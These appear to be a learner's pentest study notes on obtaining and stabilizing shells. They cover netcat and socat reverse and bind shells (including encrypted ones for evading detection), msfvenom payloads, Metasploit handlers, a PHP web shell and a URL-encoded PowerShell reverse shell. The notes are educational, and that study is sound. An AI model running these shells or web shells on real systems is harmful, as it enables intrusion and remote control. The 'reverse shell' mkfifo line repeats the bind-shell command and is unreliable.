---
id: ixopv5geql8hlgkwk20pxow
title: Shells
desc: ''
updated: 1655599508458
created: 1655331743105
---

# What is a Shell?

Shells are what we use when interfacing with a Command Line environment (CLI).

- bash or sh for Linux
- cmd.exe and Powershell on Windows

We can force the remote server to either send us command line access to the server (a **reverse** shell), or to open a port on the server to connect and execute further commands (a **bind** shell.)

## Tools

There are a variety of tools to receive reverse shells and to send bind shells.

### Netcat

Netcat is the traditional "Swiss Army Knife" of networking.

- Used to perform all kinds of network interactions including things like banner grabbing during enumeration, and used to receive reverse shells and connect to remote ports attached to bind shells on a target.

[[Reverse shells require shellcode and a listener. The syntax for starting a netcat listener using Linux:|#reverse-shell-example]] `nc -lvnp <PORT>`

- `-l` to tell netcat that this will be a listener
- `-v` to request a verbose output
- `-n` tells netcat not to resolve host names or use DNS
- `-p` indicates the port specification will follow

Any port could be used as long there is not a service already using it. If you choose to use a port below 1024, you will need `sudo` to start the listener.

- A good idea to use well-known port numbers (80, 443 or 53) as this is more likely to get past outbound firewall rules on the target.

For [[bind shells|#bind-shell-example]], we assume there is already a listener waiting for us on a chosen port of the target. All we have to do is connect with the syntax: `nc <TARGET-IP> <CHOSEN-PORT>`.

- We use netcat to make an outbound connection to the target on our chosen port.

#### Netcat Shell Stabilization

These shells are very unstable by default. Pressing CTRL+C kills the whole session and are non-interactive. There are ways to stabilize netcat shells on Linux systems. Meanwhile, Windows reverse shells tend to be significantly difficult.

##### Python

Almost every Linux distribution will have Python installed by default.

1. `python -c 'import pty;pty.spawn("/bin/bash")'` uses Python to spawn a better featured bash shell. Note that some targets may need the version of Python specified such as `python2` or `python3` as required.
2. `export TERM=xterm` will give us access to term commands such as `clear`.
3. Finally background the shell using CTRL+Z. Back in our own terminal, we can use `stty raw -echo; fg` to allow us to turn off our own terminal echo (gives access to tab completions, the arrow keys, and CTRL+C to kill processes). It then foregrounds the shell and completing the process.

![python](https://i.imgur.com/bQnFz1T.png)

If the shell dies, any input in your own terminal will not be visible (result of having disabled terminal echo). Type `reset` and enter to fix this.

##### rlwrap

rlwrap is a program gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell. However, some manual stabilization must still be utilized to use CTRL+C inside the shell. rlwrap is not installed by default on Kali and can be installed with: `sudo apt install rlwrap`.

To use rlwrap listener: `rlwrap nc -lvnp <PORT>`

- 'rlwrap' provides a much more fully featured shell. This technique is useful with Windows shells which are difficult to stabilize.
  - With Linux target, it is possible to completely stabilize with the same trick before: background the shell with CTRL+Z, then use `stty raw -echo; fg` to stabilize and re-enter the shell.

##### Socat Stable

The third easy way to stabilize a shell is initialize a netcat shell as a stepping stone to a full featured socat shell. This technique is limited to Linux targets, as Socat shells on Windows will be no more stable than a netcat shell.

1. First transfer a socat static compiled binary (a version of the program compiled to have no dependencies) to the target machine. A common way to achieve this would be use web server on the attacking machine inside the directory containing socat binary (`sudo python3 -m http.server 80`).
2. On the target machine, use the netcat shell to download the file with `wget <LOCAL-IP>/socat -O /tmp/socat` for Linux. On Windows machine CLI environment with Powershell: `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`.

##### Change Terminal tty Size

Must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.

1. Open another terminal and run `stty -a`. This will give a large stream of output.
2. In the reverse/bind shell, type `stty rows <number>` and `stty cols <number>`.
3. Input the numbers returned from running the command in own terminal. This will change the width and height of the terminal to allow programs such as text editors do display information to be accurate and correctly open.

### Socat

Like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. However, the two big catches are:

1. The syntax is more difficult
2. Netcat is installed on virtually every Linux distribution by default. Socat is rarely installed by default.


Both Socat and Netcat have .exe versions for use on Windows.

#### Socat Reverse Shells

Socat is a connector between two points similar to the portal gun from the Portal games.

The syntax for a basic reverse shell listener in socat: `socat TCP-L:<PORT> -`. This will work on either Linux or Windows and is equivalent to `nc -lvnp <PORT>`.

On Windows use to connect back: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`. The pipes option is used to force powershell or cmd.exe to use Unix style standard input and output.

The equivalent for Linux target: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`.

#### Socat Bind Shells

On a Linux target: `socat TCP-L:<PORT> EXEC:"bash -li"`.

On a Windows target: `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`.

Regardless of the target, we use `socat TCP:<TARGET-IP>:<TARGET-PORT> -` on the attacking machine to connect to the waiting listener.

- For a fully stable Linux tty reverse shell: `socat TCP-L:<PORT> FILE:'tty',raw,echo=0`
- To connect to the listener: `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`.
  - `EXEC:"bash -li"` creates an interactive bash session with the arguments: pty, stderr, sigint, setsid, and sane.
    - `pty` allocates a pseudo-terminal on the target - part of the stabilization process.
    - `stderr` makes sure that any error messages get shown in the shell (often a problem in non-interactive shells).
    - `sigint` passes any CTRL+C commands through into the sub-process, allowing us to kill commands inside the shell.
    - `setsid` creates the process in a new session.
    - `sane` stabilizes the terminal, attempting to 'normalize' it.

#### Socat Encrypted Shells

Socat is capable of creating encrypted shells - both bind and reverse. Encrypted shells cannot be spied on unless you have the decryption key and are often able to bypass an IDS as a result.

1. Generate a certificate in order to use encrypted shells on our attacking machine: `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`. This command creates a 2048 bit RSA key with a matching cert file, self-signed, and valid for just under a year. It will ask to fill information about the certificate and can be let blank, or filled randomly.
2. Now need to merge the two files into a single `.pem` file: `cat shell.key shell.crt > shell.pem`.
3. Set up our reverse shell listener with `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0`. This opens up an OPENSSL listener using the generated certificate and `verify=0` tells the connection to not bother trying to validate our certificate has been properly signed by a recognized authority.
   - The certificate must be used on whichever device is listening.
4. Connect back with `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`.

The same technique would apply for a bind shell.

- Target: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
- Attacker: `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0`
### Metasploit -- multi/handler

The `auxiliary/multi/handler` module of the Metasploit framework is, like socat and netcat, used to receive reverse shells.

- The only way to interact with a meterpreter shell and easiest way to handle staged payloads.

### Msfvenom

Like multi/handler, msfvenom is technically part of the Metasploit Framework.

- Shipped as a standalone tool
- Used to generate payloads on the fly
- Msfvenom can generate payloads other than reverse and bind shells

## Types of Shell

### Reverse Shells

When the target is forced to execute code that connects back to your computer (need a listener back to attacker computer).

- Reverse shells are good way to bypass firewall rules that may prevent from connecting to arbitrary ports on the target.
  - Drawback is to configure own network to accept the shell over the internet.

#### Reverse Shell Example

A reverse shell listener to receive the connection. A simulation of sending a reverse shell.

![reverse shell](https://i.imgur.com/rN7YkJJ.png)

On the attacking machine: `sudo nc -lvnp 443`

On the the target: `nc <LOCAL-IP> <PORT> -e /bin/bash`

### Bind Shells

When the code executed on the target is used to start a listener attached to a shell directly on the target.

- Open to the internet allowing to connect to the port that the code has opened and obtain remote code execution.
  - Advantage of not requiring any configuration on own network, but may be prevented by firewalls protecting the target.

#### Bind Shell Example

Listener on the target and telling it to execute `cmd.exe`.

On the target: `nc -lvnp <PORT> -e "cmd.exe"`

On the attacking machine: `nc MACHINE_IP <PORT>`

![bind shell](https://i.imgur.com/6GUwZsw.png)

### Interactive

If used Powershell, Bash, Zsh, sh or any other standard CLI environment to allow interaction with programs after executing them.

### Non-Interactive

Limited to using programs which do not require user interaction in order to run properly. The majority of simple reverse and bind shells are non-interactive.

## Common Shell Payloads

On Linux, we use this code to create a listener for a bind shell: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`.

- The command first creates a named pipe at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe.
- A very similar command can be used to send a netcat reverse shell: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
- For other common reverse shell payloads, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages.

## msfvenom

Msfvenom: The one-stop-shop for all things payload related. Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells.

The standard syntax for msfvenom: `msfvenom -p <PAYLOAD> <OPTIONS>`.

- To generate a Windows x64 Reverse Shell in an exe format: `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`.
  - `-f` specifies the output format.
  - `-o` the output location and filename for the generated payload.
  - `LHOST=<IP>` specifies the IP to connect back to.
  - `LPORT=<PORT>` the port on the local machine to connect back to. This can be anything between 0-65535 that isn't already in use. However, the ports below 1024 are restricted and require a listener running with root privileges.

### Staged Payloads

Staged payloads are sent in two parts.

1. Stager - A piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead, it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions.

- The payloads are split into two parts - a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener - usually the Metasploit multi/handler.

### Stageless Payloads

Stageless payloads are more common where they are entirely self-contained. There is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

### Meterpreter

[[Meterpreter shells are Metasploit's own brand of fully-featured shell|metasploit.meterpreter]]. They are completely stable, making them very good when working with Windows targets.

- Built-in functionality such as file uploads and downloads.
- Downside is meterpreter shells must be caught in Metasploit.
- Also banned from certain certification examinations.

### Payload Naming Conventions

When working with msfvenom, the basic convention is `<OS>/<arch>/<payload>`.

- Example: `linux/x86/shell_reverse_tcp`
  - This would generate a stageless reverse shell for an x86 Linux target.

The exception to this convention is Windows 32 bit targets. The arch is not specified: `windows/shell_reverse_tcp`

- For a 64 bit Windows target, the arch would be specified as normal (x64).

Stageless payloads are denoted with underscores (`_`). The staged equivalent would be `shell/reverse_tcp`

- Staged payloads are denoted with another forward slash (`/`).
  - A Windows 64 bit staged Meterpreter payload: `windows/x64/meterpreter/reverse_tcp`
  - A Linux 32 bit stageless Meterpreter payload: `linux/x86/meterpreter_reverse_tcp`

`msfvenom --list payloads` can be used to list all available payloads, which can then be piped into `grep` to search for a specific set of payloads.

![payloads](https://i.imgur.com/iFO6ydX.png)

### [[Metasploit|metasploit]] multi/handler

Multi/Handler is a superb tool for catching reverse shell. It is essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.

1. Open Metasploit with `msfconsole`.
2. Type `use multi/handler/`, and press Enter.

Using the `options` command, we need to set: payload, LHOST and LPORT.

- Set these options with the following commands: 
  - `set PAYLOAD <payload>`
  - `set LHOST <listen-address>`
  - `set LPORT <listen-port>`

We can now start a listener with `exploit -j` to tell Metasploit to launch the module, running the job in the background.

- When multi/handler is in the background, use `sessions` to see all active sessions, and then use `sessions <number>` to select the appropriate session to foreground.

## Web Shells

There are times where websites allow us an opportunity to upload an executable file. A 'webshell' is a term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server.

- Commands are entered into a webpage - either through an HTML form, or directly in the URL - which are then executed by the script.
- Extremely useful if there are firewalls in place, or even a stepping stone into a fully fledged reverse or bind shell.

PHP is still the most common server side scripting language.

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

This will take a GET parameter in the URL and execute it on the system with `shell_exec()`. Any commands we enter in the URL after `?cmd=` will be executed  on the system - Windows or Linux. The pre elements are to ensure that the results are formatted correctly on the page.

There are a variety of web shells available on Kali by default at `/usr/share/webshells` - including the the infamous [PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) - a full reverse shell written in PHP.

- Most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux web servers. They will not work on Windows by default.
- When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server.
- RCE with URL Encoded Powershell Reverse Shell copied into the URL: 
  - `powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`
    - Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.